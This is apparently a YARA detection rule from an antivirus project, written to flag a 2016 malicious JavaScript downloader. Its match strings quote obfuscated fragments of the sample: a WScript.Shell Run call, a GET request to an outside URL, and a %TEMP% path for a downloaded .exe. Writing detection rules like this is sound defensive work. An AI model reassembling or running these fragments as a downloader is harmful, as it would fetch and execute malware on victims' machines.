rule sig_20160328_aa9ffe29c9c5534a0478659d6bd3bf1c {
  meta:
    description = "datamaliciousorder - file 20160328_aa9ffe29c9c5534a0478659d6bd3bf1c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "016724d757f92c2ae87bb7323c7554bc945a6317331fb9e265527f5cc30fc098"

  strings:
    $s1  = "function Pkmgtysoag() {return Osousqk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"6qnLv0fH0.exe\";};" fullword ascii
    $s2  = "Eujnaeaf[Priwboccft](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Qtgoh](Alzdoclpau() * 11)} while (Eujnaeaf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Osousqk = function Womoi() {return WScript[Uaolgfa](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qphsqa(Clerpsdfmf, Lvhpu){return Clerpsdfmf - Lvhpu;};" fullword ascii
    $s6  = "function Lesvwdjjc() {return ((Ldpyh == true) && (Ldpyh == Xcqxdy)) ? 1 : Kjjdivuds;};" fullword ascii
    $s7  = "function Fepvssewam(Uiszsupxcr){Osousqk[\"Run\"](Uiszsupxcr, Kjjdivuds, Kjjdivuds);};" fullword ascii
    $s8  = "function Rjzioyvpp()" fullword ascii
    $s9  = "function Rttrr(Lwxfan) {var Mcoiaeebim = (1, 2, 3, 4, 5, Lwxfan); return Mcoiaeebim;};" fullword ascii
    $s10 = "Xcqxdy = true; " fullword ascii
    $s11 = "function Kpvky(){return Iavmlibj;};" fullword ascii
    $s12 = "var Tpcus = false;" fullword ascii
    $s13 = "Ldpyh = true; " fullword ascii
    $s14 = "var Lcozrwguv = new this[\"Date\"]();" fullword ascii
    $s15 = "return Qphsqa(Wtmmhafqcd, Ayjyeqk);" fullword ascii
    $s16 = "var Ldpyh = false;" fullword ascii
    $s17 = " while (Kgzsjt){" fullword ascii
    $s18 = "function Alzdoclpau(){return 22;};" fullword ascii
    $s19 = "var Xcqxdy = false;" fullword ascii
    $s20 = "function Xvvaypniks(){return Uaolgfa;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}